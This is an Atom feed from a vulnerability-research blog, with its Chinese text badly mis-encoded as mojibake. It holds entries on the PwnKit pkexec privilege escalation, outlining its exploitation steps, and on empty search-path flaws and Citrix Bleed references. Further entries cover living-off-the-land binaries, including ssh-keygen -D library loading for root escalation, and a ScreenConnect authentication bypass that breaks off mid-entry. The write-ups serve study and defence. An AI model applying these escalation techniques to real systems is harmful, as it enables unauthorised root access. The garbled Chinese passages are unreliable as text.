<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ç¨‹åºäººç”Ÿ</title>
  
  <subtitle>Fuzzing / Vulnerability / Exploit</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://programlife.net/"/>
  <updated>2024-03-17T03:27:22.000Z</updated>
  <id>http://programlife.net/</id>
  
  <author>
    <name>Ke Liu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2021-4034 PwnKit PolKit pkexec æœ¬åœ°ææƒæ¼æ´</title>
    <link href="http://programlife.net/2024/03/17/cve-2021-4034-pwnkit-polkit-pkexec-lpe/"/>
    <id>http://programlife.net/2024/03/17/cve-2021-4034-pwnkit-polkit-pkexec-lpe/</id>
    <published>2024-03-17T13:33:37.000Z</published>
    <updated>2024-03-17T03:27:22.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>CVE-2021-4034 PwnKit PolKit pkexec Local Privilege Escalation Vulnerability</p></blockquote><a id="more"></a><p>CVE-2021-4034 æ˜¯ Qualys Research Team å‘ç°çš„ä½äº PolKit pkexec ä¸­çš„æœ¬åœ°ææƒæ¼æ´ï¼Œæ¼æ´å–å PwnKitï¼ŒåŸå§‹æŠ¥å‘Šå¯ä»¥å‚è€ƒ <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener">pwnkit: Local Privilege Escalation in polkitâ€™s pkexec (CVE-2021-4034)</a> / <a href="https://web.archive.org/web/20240211132200/https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener">Wayback Machine</a>ã€‚</p><p>è¯¥æ¼æ´è·å¾—äº† <a href="https://pwnies.com/category/nominations/?y=2022" target="_blank" rel="noopener">Pwnie Awards / Epic Achievement</a> æåï¼š</p><blockquote><ul><li>THAT VIASAT THINGIE</li><li>Yuki Chenâ€™s Windows Server-Side RCE Bugs</li><li>pwnkit: Local Privilege Escalation in polkitâ€™s pkexec (CVE-2021-4034)</li></ul></blockquote><p>è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨éå¸¸å·§å¦™ï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹ä¸‹ <a href="https://xz.aliyun.com/t/10870?time__1311=mq%2BxB7W%3DD%3DDsD7Ce0%3DeY0KKqRDcQBxYwD" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº - CVE-2021-4034 æ·±å…¥åˆ†æåŠæ¼æ´å¤ç°</a> / <a href="https://web.archive.org/web/20240317025711/https://xz.aliyun.com/t/10870?time__1311=mq%2BxB7W%3DD%3DDsD7Ce0%3DeY0KKqRDcQBxYwD" target="_blank" rel="noopener">Wayback Machine</a>ï¼Œè¿™ç¯‡æ–‡ç« ä»‹ç»çš„æ¯”è¾ƒå…¨é¢ï¼ˆåŒ…æ‹¬æ¼æ´åŸç†ã€<code>ld.so</code> å¤„ç† SUID-root ç¨‹åºçš„å±é™©ç¯å¢ƒå˜é‡ã€Exploit å®ç°ç»†èŠ‚ä¸Šéœ€è¦æ³¨æ„çš„é—®é¢˜ç­‰ï¼‰ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨æµç¨‹</strong>ï¼š</p><ol><li><code>execve</code> æ‰§è¡Œ PolKit pkexec æ—¶ï¼Œè®© <code>argv</code> ä¸ºç©ºæ•°ç»„ï¼ˆé•¿åº¦ä¸º <code>0</code>ï¼‰</li><li>PolKit pkexec <code>argv[1]</code> è¶Šç•Œè®¿é—®ï¼ˆOut-of-Bounds Read åˆ° <code>envp[0]</code>ï¼‰</li><li>ç›¸å¯¹è·¯å¾„æ‰©å±•ï¼ˆé€šè¿‡ <code>execve</code> æ§åˆ¶ <code>PATH</code> ç¯å¢ƒå˜é‡ï¼Œå¯¹ <code>envp[0]</code> å®æ–½è·¯å¾„æ‰©å±•ï¼‰</li><li><code>argv[1]</code> è¶Šç•Œå†™å…¥ï¼ˆOut-of-Bounds Writeï¼‰ï¼Œå®ç°æ”¹å†™ <code>envp[0]</code>ï¼Œè¾¾åˆ°æ³¨å…¥ä»»æ„ç¯å¢ƒå˜é‡çš„ç›®çš„</li><li>åˆ©ç”¨ä¸Šä¸€æ­¥æ³¨å…¥ <code>GCONV_PATH</code> ç¯å¢ƒå˜é‡ï¼Œé…åˆ glib çš„ <code>g_printerr</code>ï¼Œåœ¨è¿›è¡Œå­—ç¬¦é›†è½¬æ¢æ—¶å®ç°åŠ è½½è‡ªå®šä¹‰ so åŠ¨æ€åº“</li><li>å®Œæˆææƒæ“ä½œ</li></ol><p><strong>æ¼æ´åˆ©ç”¨æ³¨æ„äº‹é¡¹</strong>ï¼š<code>setenv</code> <strong>å¯èƒ½</strong>ä¼šå¯¼è‡´ç¯å¢ƒå˜é‡æ•°ç»„ <code>envp</code> å‘ç”Ÿä½ç½®è¿ç§»</p><p><strong>æ¼æ´ä¿®å¤</strong>ï¼šé™¤äº†å¯¹ pkexec æœ¬èº«è¿›è¡Œä¿®å¤å¤–ï¼Œæ“ä½œç³»ç»Ÿå±‚é¢å¯èƒ½ä¸å†æ”¯æŒ <code>execve(path, {NULL}, envp)</code> è¿™ç§æ“ä½œï¼Œæˆ–è€…è¯´ï¼Œè‡³å°‘ä¼šå¯¹è¿™ç§ç‰¹æ®Šçš„ <code>argv</code> è¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚è½¬æ¢æˆ <code>{&quot;&quot;, NULL}</code>ï¼ˆ<code>argc</code> ä»ç„¶ä¸º <code>0</code>ï¼‰ï¼Œè¿™æ ·å³ä½¿å­˜åœ¨ç±»ä¼¼ pkexec è¿™æ ·çš„æ¼æ´ï¼Œä¹Ÿæ— æ³•è¿›è¡Œåˆ©ç”¨äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;CVE-2021-4034 PwnKit PolKit pkexec Local Privilege Escalation Vulnerability&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="http://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="http://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="PolKit" scheme="http://programlife.net/tags/PolKit/"/>
    
      <category term="ld.so" scheme="http://programlife.net/tags/ld-so/"/>
    
      <category term="GCONV_PATH" scheme="http://programlife.net/tags/GCONV-PATH/"/>
    
      <category term="LPE" scheme="http://programlife.net/tags/LPE/"/>
    
  </entry>
  
  <entry>
    <title>Linux Empty Search Path Vulnerability</title>
    <link href="http://programlife.net/2024/03/16/linux-empty-search-path-vulnerability/"/>
    <id>http://programlife.net/2024/03/16/linux-empty-search-path-vulnerability/</id>
    <published>2024-03-16T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Empty Search Path (PATH or LD_LIBRARY_PATH) could lead to security vulnerabilities.</p></blockquote><a id="more"></a><p><strong>CWE-427: Uncontrolled Search Path Element</strong></p><ul><li><p><a href="https://cwe.mitre.org/data/definitions/427.html" target="_blank" rel="noopener">CWE - CWE-427: Uncontrolled Search Path Element (4.14)</a> / <a href="https://web.archive.org/web/20240316031216/https://cwe.mitre.org/data/definitions/427.html" target="_blank" rel="noopener">Wayback Machine</a></p></li><li><blockquote><p>In some Unix-based systems, a <strong>PATH</strong> might be created that contains an empty element, e.g. by splicing an empty variable into the <strong>PATH</strong>. This empty element can be interpreted as equivalent to the current working directory, which might be an untrusted search element.</p></blockquote></li></ul><p><strong>Empty Entry in LD_LIBRARY_PATH May Lead to Security Issues</strong></p><ul><li><p><a href="https://jdhao.github.io/2021/07/03/ld_library_path_empty_item/" target="_blank" rel="noopener">Empty Entry in LD_LIBRARY_PATH May Lead to Security Issues</a> / <a href="https://web.archive.org/web/20240316031202/https://jdhao.github.io/2021/07/03/ld_library_path_empty_item/" target="_blank" rel="noopener">Wayback Machine</a></p></li><li><blockquote><p>An empty item is interpreted by <code>ld</code> as the current working directory. As a result, <code>ld</code> may load library from the current working directory, causing unintended effects, or even security vulnerability if an attacker puts some harmful library in the current directory.</p></blockquote></li></ul><p><strong>CVE-2010-4450</strong></p><ul><li><blockquote><p>Oracle has not commented on claims from a downstream vendor that this issue is an untrusted search path vulnerability involving an empty <strong>LD_LIBRARY_PATH</strong> environment variable.</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Empty Search Path (PATH or LD_LIBRARY_PATH) could lead to security vulnerabilities.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="http://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="http://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="ld.so" scheme="http://programlife.net/tags/ld-so/"/>
    
      <category term="LD_LIBRARY_PATH" scheme="http://programlife.net/tags/LD-LIBRARY-PATH/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´æ¡ˆä¾‹ç ”ç©¶ CVE-2023-4966 Citrix Bleed ä¿¡æ¯æ³„éœ²æ¼æ´</title>
    <link href="http://programlife.net/2024/03/11/cve-2023-4966-citrix-bleed/"/>
    <id>http://programlife.net/2024/03/11/cve-2023-4966-citrix-bleed/</id>
    <published>2024-03-11T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Citrix Bleed æ¼æ´ï¼ˆCVE-2023-4966ï¼‰ç›¸å…³çš„å‡ ç¯‡å‚è€ƒæ–‡æ¡£</p></blockquote><a id="more"></a><p>Citrix Bleed æ¼æ´ï¼Œå³ CVE-2023-4966ï¼Œç®—æ˜¯ 2023 å¹´æ¯”è¾ƒçŸ¥åçš„æ¼æ´äº†ï¼Œè¢« DARKNAVY è¯„ä¸º <a href="https://mp.weixin.qq.com/s/YO55cT4jjqFukCdAWxkNiQ?forceh5=1" target="_blank" rel="noopener">2023 å¹´åº¦æœ€è´¹é’±çš„æ¼æ´</a>ä¹‹ä¸€ï¼ˆå¦ä¸€ä¸ªæ¼æ´æ˜¯ CVE-2023-34362ï¼‰ï¼Œå¦‚æœä½ æ²¡æœ‰å¬è¯´è¿‡è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥äº†è§£ä¸‹ç›¸å…³çš„èƒŒæ™¯ä¿¡æ¯ã€‚</p><p><strong>æ¼æ´çš„åŸç†éå¸¸ç®€å•</strong>ï¼šè¯¯ç”¨ <code>snprintf</code> å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹è¿œç¨‹è§¦å‘æ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥æ¥æ”¶åˆ°é€šè¿‡ OOB Read æ³„éœ²çš„è¿›ç¨‹å†…å­˜å†…å®¹ï¼Œæ¨¡å¼ä¸Šç±»ä¼¼ Heart Bleed æ¼æ´ã€‚</p><p>å¯¹äºæ¼æ´ç»†èŠ‚ï¼Œè¿™é‡Œä¸åšèµ˜è¿°ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥é˜…è¯»ä¸‹é¢å‡ ç¯‡æ–‡ç« ï¼ˆå› ä¸ºäº’è”ç½‘ä¸Šçš„é“¾æ¥æ€»ä¼šå› ä¸ºå„ç§åŸå› è€Œä¸å†æœ‰æ•ˆï¼Œæ‰€ä»¥æˆ‘ç»™ä»–ä»¬åšäº†ä¸€ä¸ªå¤‡ä»½ï¼‰ï¼š</p><ol><li><a href="https://securitylab.github.com/research/librelp-buffer-overflow-cve-2018-1000140/" target="_blank" rel="noopener">Librelp buffer overflow fix (cve-2018-1000140) - a collaboration between Adiscon and Semmle</a> / <a href="https://web.archive.org/web/20240311130505/https://securitylab.github.com/research/librelp-buffer-overflow-cve-2018-1000140/" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li><li><a href="https://securitylab.github.com/research/cve-2018-18820-snprintf-vulnerability-icecast/" target="_blank" rel="noopener">CVE-2018-18820: Snprintf Vulnerability in Icecast</a> / <a href="https://web.archive.org/web/20240311130514/https://securitylab.github.com/research/cve-2018-18820-snprintf-vulnerability-icecast/" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li><li><a href="https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966" target="_blank" rel="noopener">Citrix Bleed: Leaking Session Tokens with CVE-2023-4966</a> / <a href="https://web.archive.org/web/20240311130513/https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li><li><a href="https://paper.seebug.org/269/" target="_blank" rel="noopener">å®æˆ˜æ ˆæº¢å‡ºï¼šä¸‰ä¸ªæ¼æ´æå®šä¸€å°è·¯ç”±å™¨</a> / <a href="https://web.archive.org/web/20170610035343/http://paper.seebug.org/269/" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li><li><a href="https://bestwing.me/CVE-2023-4966-Citrix-memory-leak.html" target="_blank" rel="noopener">CVE-2023-4966 citrix å†…å­˜æ³„æ¼</a> / <a href="https://web.archive.org/web/20240311132549/https://bestwing.me/CVE-2023-4966-Citrix-memory-leak.html" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li></ol><p>è§£é‡Šä¸€ä¸‹å¼•ç”¨ä¸Šé¢å‡ ç¯‡æ–‡ç« çš„åŸå› ï¼š</p><ol><li>GitHub Security Lab çš„æ–‡ç« ï¼Œå¾ˆå¥½çš„è§£é‡Šäº†ä¸ <code>snprintf</code> æœ‰å…³çš„ <code>2</code> ä¸ªæ³¨æ„äº‹é¡¹</li><li>GitHub Security Lab çš„æ–‡ç« ï¼Œå’Œå‰ä¸€ç¯‡å·®ä¸å¤š</li><li>Assetnote çš„æ–‡ç« ï¼Œå¯èƒ½æ˜¯æœ€æ—©å…¬å¼€ Citrix Bleed ç»†èŠ‚çš„æ–‡ç« ï¼ˆ<strong>æœªè€ƒè¯</strong>ï¼‰</li><li>é•¿äº­ç§‘æŠ€çš„ä¸€ç¯‡è€æ–‡ç« ï¼Œä¸ä»…è¯´æ˜äº†å†å²åœ¨ä¸æ–­é‡å¤ï¼Œä¹Ÿè¯´æ˜äº†å†å²æƒŠäººçš„ç›¸ä¼¼æ€§</li><li>é•¿äº­ç§‘æŠ€ä¸€åå‘˜å·¥çš„åšå®¢ï¼Œå¼•ç”¨è¿™ç¯‡æ–‡ç« å•çº¯æ˜¯å› ä¸ºä»–ä¹Ÿæåˆ°é•¿äº­çš„å‰ä¸€ç¯‡æ–‡ç« </li></ol><p><strong>å¦‚æœä½ æƒ³å¤ç°è¿™ä¸ªæ¼æ´ï¼Œä½†æ˜¯ç”±äºå®¢è§‚åŸå› æ— æ³•é¡ºåˆ©æ­å»ºå¤ç°ç¯å¢ƒï¼Œå¯ä»¥è”ç³»æˆ‘å…è´¹è·å– Tipsï¼ŒèŠ‚çº¦æ—¶é—´å’Œé‡‘é’± :P</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Citrix Bleed æ¼æ´ï¼ˆCVE-2023-4966ï¼‰ç›¸å…³çš„å‡ ç¯‡å‚è€ƒæ–‡æ¡£&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="http://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Citrix" scheme="http://programlife.net/tags/Citrix/"/>
    
      <category term="snprintf" scheme="http://programlife.net/tags/snprintf/"/>
    
  </entry>
  
  <entry>
    <title>Living Off the Land Techniques</title>
    <link href="http://programlife.net/2024/03/03/living-off-the-land-techniques/"/>
    <id>http://programlife.net/2024/03/03/living-off-the-land-techniques/</id>
    <published>2024-03-03T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Living off the Land</strong> (<strong>LOTL</strong>) involves the abuse of native tools and processes on systems, especially living off the land binaries, often referred to as <strong>LOLBins</strong>, to blend in with normal system activities and operate discreetly with a lower likelihood of being detected or blocked because these tools are already deployed and trusted in the environment.</p></blockquote><a id="more"></a><h2 id="0x01-Living-off-the-Land"><a href="#0x01-Living-off-the-Land" class="headerlink" title="0x01. Living off the Land"></a>0x01. Living off the Land</h2><p>Living off the Landï¼ŒæŒ‰ç…§ä¿¡è¾¾é›…çš„ç¿»è¯‘å¯ä»¥ç†è§£ä¸ºâ€œ<strong>é å±±åƒå±±ï¼Œé æ°´åƒæ°´</strong>â€ :P</p><p>å‡ ä¸ªæ”¶é›†æ­¤ç±»ä¿¡æ¯çš„ç½‘ç«™å¦‚ä¸‹ï¼š</p><ol><li>Unix - <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></li><li>Windows - <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">https://lolbas-project.github.io/</a></li><li>macOS - <a href="https://www.loobins.io/" target="_blank" rel="noopener">https://www.loobins.io/</a></li><li>Windows Drivers - <a href="https://www.loldrivers.io/" target="_blank" rel="noopener">https://www.loldrivers.io/</a></li></ol><p>æœ€åä¸€ä¸ªï¼ˆWindows é©±åŠ¨ï¼‰å’Œ BYOVD æ˜¯ä¸€ä¸ªæ„æ€ï¼Œå³ <strong>Bring Your Own Vulnerable Driver</strong>ï¼Œç›®å‰æ¶æ„è½¯ä»¶å¸¸ç”¨çš„ææƒæ–¹å¼ä¹‹ä¸€ã€‚DefCon 27 ä¸Šæœ‰ä¸ªä¸“é—¨è®²æ€ä¹ˆæŒ–æ˜å’Œåˆ©ç”¨ç¬¬ä¸‰æ–¹é©±åŠ¨ç¨‹åºæ¼æ´çš„è®®é¢˜ã€Š<a href="https://media.defcon.org/DEF CON 27/DEF CON 27 presentations/DEFCON-27-Jesse-Michael-Get-off-the-kernel-if-you-cant-drive.pdf" target="_blank" rel="noopener">Defcon 27: Get off the Kernel if you canâ€™t Drive</a>ã€‹ã€‚</p><p><img src="/uploads/202403/Get-Off-The-Kernel-If-You-Cannot-Drive.webp" alt="Defcon 27: Get off the Kernel if you can&#39;t Drive"></p><p>CISA (<em>Cybersecurity and Infrastructure Security Agency</em>) é˜²å¾¡æŒ‡å¼•ï¼š</p><ol><li><a href="https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques" target="_blank" rel="noopener">Identifying and Mitigating Living Off the Land Techniques</a></li><li><a href="https://www.cisa.gov/sites/default/files/2024-02/Joint-Guidance-Identifying-and-Mitigating-LOTL_V3508c.pdf" target="_blank" rel="noopener">Identifying and Mitigating Living Off the Land Techniques - PDF</a></li></ol><h2 id="0x02-ssh-keygen-ææƒæ¡ˆä¾‹"><a href="#0x02-ssh-keygen-ææƒæ¡ˆä¾‹" class="headerlink" title="0x02. ssh-keygen ææƒæ¡ˆä¾‹"></a>0x02. ssh-keygen ææƒæ¡ˆä¾‹</h2><p>å‚è€ƒï¼š<a href="https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html" target="_blank" rel="noopener">Leveraging ssh-keygen for Arbitrary Execution (and Privilege Escalation)</a></p><p>å¹¶ä¸æ˜¯è¯´ <code>ssh-keygen</code> æœ¬èº«å­˜åœ¨ææƒé—®é¢˜ï¼Œè€Œæ˜¯è¯´åœ¨å¯ä»¥ä»¥ <code>root</code> æƒé™è¿è¡Œè¯¥ç¨‹åºçš„åœºæ™¯ä¸‹ï¼ˆæ¯”å¦‚ <code>sudoers</code> é…ç½®ã€SUID è®¾ç½®ç­‰ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨è¯¥ç¨‹åºæ¥åŠ è½½æŒ‡å®šçš„åŠ¨æ€åº“ï¼ˆ<code>-D</code> é€‰é¡¹ï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ man ssh-keygen</span><br><span class="line">SSH-KEYGEN(1)             BSD General Commands Manual               SSH-KEYGEN(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">     ssh-keygen â€” OpenSSH authentication key utility</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">[...]</span><br><span class="line">     ssh-keygen -D pkcs11</span><br><span class="line">[...]</span><br><span class="line">     -D pkcs11</span><br><span class="line">             Download the public keys provided by the PKCS#11 shared library pkcs11.</span><br><span class="line">             When used in combination with -s, this option indicates that a CA key</span><br><span class="line">             resides in a PKCS#11 token (see the CERTIFICATES section for details).</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>åŸæ–‡æåˆ°äº†ä¸¤ç§æ€è·¯ï¼š</p><ol><li>åœ¨ç›®æ ‡æœºå™¨ä¸Šæœç´¢ä¸€ä¸ªå¯ä»¥ <code>exec /bin/sh</code> çš„å€™é€‰åŠ¨æ€åº“ï¼Œç„¶åé€šè¿‡åå…­è¿›åˆ¶ç¼–è¾‘å™¨ã€åæ±‡ç¼–å™¨ï¼ˆGhidra æˆ– IDAï¼‰ã€patchelf ç­‰ï¼Œå¯¹å…¶è¿›è¡Œ Patch æ“ä½œ</li><li>è‡ªå·±å†™ä¸€ä¸ªï¼ˆåªéœ€è¦å†™ä¸€ä¸ª <code>constructor</code> å‡½æ•°å³å¯ï¼‰ï¼Œæœ¬åœ°äº¤å‰ç¼–è¯‘åä¸Šä¼ </li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Living off the Land&lt;/strong&gt; (&lt;strong&gt;LOTL&lt;/strong&gt;) involves the abuse of native tools and processes on systems, especially living off the land binaries, often referred to as &lt;strong&gt;LOLBins&lt;/strong&gt;, to blend in with normal system activities and operate discreetly with a lower likelihood of being detected or blocked because these tools are already deployed and trusted in the environment.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Red Teaming" scheme="http://programlife.net/categories/Red-Teaming/"/>
    
    
      <category term="LOTL" scheme="http://programlife.net/tags/LOTL/"/>
    
      <category term="LOLBins" scheme="http://programlife.net/tags/LOLBins/"/>
    
      <category term="BYOVD" scheme="http://programlife.net/tags/BYOVD/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´æ¡ˆä¾‹ç ”ç©¶ ConnectWise ScreenConnect Authentication Bypass</title>
    <link href="http://programlife.net/2024/02/25/connectwise-screenconnect-authentication-bypass/"/>
    <id>http://programlife.net/2024/02/25/connectwise-screenconnect-authentication-bypass/</id>
    <published>2024-02-25T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ ConnectWise ScreenConnect çˆ†äº† 2 ä¸ªæ¼æ´ï¼ˆCVE-2024-1709 å’Œ CVE-2024-1708ï¼‰ï¼Œå…¶ä¸­ <strong>CVE-2024-1709</strong> æ˜¯ä¸€ä¸ª Authentication Bypass æ¼æ´ï¼ŒCVSS è¯„åˆ† 10 åˆ†ã€‚Sophos å®‰å…¨å›¢é˜Ÿè¡¨ç¤ºï¼Œå‹¤åŠ³çš„æ”»å‡»è€…å·²ç»åœ¨ç¬¬ä¸€æ—¶é—´åˆ©ç”¨è¿™äº›æ¼æ´æ¥æŠ•é€’å‹’ç´¢è½¯ä»¶ã€‚æœ¬æ–‡ç®€å•æ•´ç†ç›¸å…³ä¿¡æ¯ï¼Œä½œä¸ºæ¼æ´æ¡ˆä¾‹ç ”ç©¶ç³»åˆ—çš„ç¬¬ä¸€ç¯‡æ–‡ç« ã€‚</p><a id="more"></a><h2 id="0x01-ä¸ºä»€ä¹ˆåœ¨è¿™æ°´æ–‡ç« "><a href="#0x01-ä¸ºä»€ä¹ˆåœ¨è¿™æ°´æ–‡ç« " class="headerlink" title="0x01. ä¸ºä»€ä¹ˆåœ¨è¿™æ°´æ–‡ç« "></a>0x01. ä¸ºä»€ä¹ˆåœ¨è¿™æ°´æ–‡ç« </h2><p>ç¬”è€…æœ€è¿‘çš„å·¥ä½œæ–¹å‘å¼€å§‹è½¬å‘äº§å“å®‰å…¨è“å†›ï¼Œå½“å‰ä¸»è¦å·¥ä½œåŒ…æ‹¬ï¼šä»£ç å®¡è®¡ã€å®‰å…¨æ”»é˜²ã€å‚ç±»æ¶æ„è½¯ä»¶æ£€æµ‹ã€‚</p><p>ä¸€æ–¹é¢ï¼Œä»£ç å®¡è®¡å’Œä¹‹å‰åšäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜åœ¨æ€è·¯ä¸Šæ¯”è¾ƒç±»ä¼¼ï¼Œæœ€é‡è¦çš„ç†ŸçŸ¥å„ç§<strong>æ¼æ´æ¨¡å¼</strong>ï¼ˆæˆ–è€…è¯´æ”»å‡»é¢ï¼‰ã€‚å°±å¥½æ¯” Integer Overflowï¼ŒæŒ–æ˜æ€è·¯å°±æ˜¯æ‰¾åˆ°å„ä¸ªå†…å­˜åˆ†é…ç‚¹ï¼Œç„¶åçœ‹å‚æ•°æ˜¯å¦æ˜¯ç»è¿‡æŸäº›ç®—æœ¯è¿ç®—è€Œæ¥ï¼Œæœ€åæ˜¯è¿™äº›å‚æ•°æ˜¯å¦æ˜¯æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æ±¡ç‚¹åˆ†æçš„æ€è·¯ã€‚ä¹Ÿä¸éš¾ç†è§£<strong>æ¼æ´æ¨¡å¼</strong>å…¶å®ç±»ä¼¼<strong>è®¾è®¡æ¨¡å¼</strong>ï¼Œæ˜¯ä¸€å¥—æ€»ç»“å‡ºæ¥çš„æ–¹æ³•è®ºã€‚</p><p>å¦ä¸€æ–¹é¢ï¼ŒçœŸæ­£çš„ RCE æ¼æ´å¾€å¾€æ˜¯æ”»å‡»è€…æœ€å–œæ¬¢çš„æ¼æ´ï¼Œæ¯”å¦‚æœ¬æ–‡æåˆ°çš„ ConnectWise ScreenConnect Authentication Bypass æ¼æ´ CVE-2024-1709ï¼Œä»¥åŠå»å¹´è¿˜ç®—æ¯”è¾ƒç«çš„ Citrix Bleed æ¼æ´ CVE-2023-4966ï¼Œéƒ½è¢«æ”»å‡»è€…ç”¨æ¥æŠ•é€’å‹’ç´¢è½¯ä»¶ï¼Œåœ¨ ATT&amp;CK æ¡†æ¶ä¸­è¢«å½’ç±»ä¸º <strong>Initial Access</strong>ã€‚è€Œåœ¨é»‘å¸‚ä¸Šï¼Œå°±æœ‰ä¸“é—¨ä»äº‹è¿™ç±»æ“ä½œçš„ç»„ç»‡ï¼Œè¢«ç§°ä¹‹ä¸º <strong>Initial Access Broker</strong>ï¼ˆIABï¼‰ï¼Œä»–ä»¬åˆ©ç”¨æ¼æ´æˆ–è€…é’“é±¼ç­‰æ‰‹æ®µæ¥è·å–å„ç§ç³»ç»Ÿçš„æƒé™ï¼Œç„¶åå°†æƒé™å€’å–ç»™å…¶ä»–ç»„ç»‡ï¼ˆæ¯”å¦‚å‹’ç´¢è½¯ä»¶å›¢ä¼™ï¼‰ã€‚</p><p>é‰´äºæ­¤ï¼Œç¬”è€…å†³å®šå¯¹è¿™ç±»æ¼æ´è¿›è¡Œç®€å•çš„åˆ†æã€æ•´ç†å’Œå½’ç±»ï¼Œä»¥ä¾¿æ—¥ååœ¨å·¥ä½œä¸­ä½œä¸ºå‚è€ƒã€‚</p><h2 id="0x02-CVE-2024-1709"><a href="#0x02-CVE-2024-1709" class="headerlink" title="0x02. CVE-2024-1709"></a>0x02. CVE-2024-1709</h2><p>åœ¨æ¼æ´æ¨¡å¼ä¸Šï¼Œæš‚ä¸”å°†è¿™ä¸ªæ¼æ´å½’ç±»ä¸º Setup Wizard ç±»å‹ã€‚</p><h3 id="2-1-æ¼æ´åŸç†"><a href="#2-1-æ¼æ´åŸç†" class="headerlink" title="2.1 æ¼æ´åŸç†"></a>2.1 æ¼æ´åŸç†</h3><p>Huntress å®‰å…¨å›¢é˜Ÿé€šè¿‡è¡¥ä¸å¯¹æ¯”åˆ†æï¼Œç»™å‡ºäº†æ¼æ´çš„ç»†èŠ‚ä¿¡æ¯ã€‚</p><p>é¦–å…ˆæ˜¯ <code>ScreenConnect\SetupWizard.aspx</code> çš„å˜åŒ–ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span 